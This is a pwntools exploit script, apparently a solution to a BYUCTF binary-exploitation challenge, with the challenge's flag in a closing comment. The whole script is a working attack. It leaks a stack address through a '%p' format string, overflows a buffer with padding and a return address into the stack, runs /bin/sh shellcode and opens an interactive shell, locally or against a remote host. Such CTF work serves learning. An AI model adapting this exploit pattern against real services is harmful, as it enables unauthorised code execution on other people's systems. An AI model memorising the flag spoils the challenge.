from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b vuln
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './all'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

offsets = 35

io.sendline('%p')
stack_address = int(io.recvline(),16)
log.info(hex(stack_address))

shellcode = asm(shellcraft.sh())
payload = flat([
    b'quit\x00',
    b'A' * offsets,
    stack_address+48,
    shellcode,
]
)


io.sendline(payload)
print(len(payload))

io.interactive()


'''
byuctf{too_many_options_what_do_I_chooooooose}
'''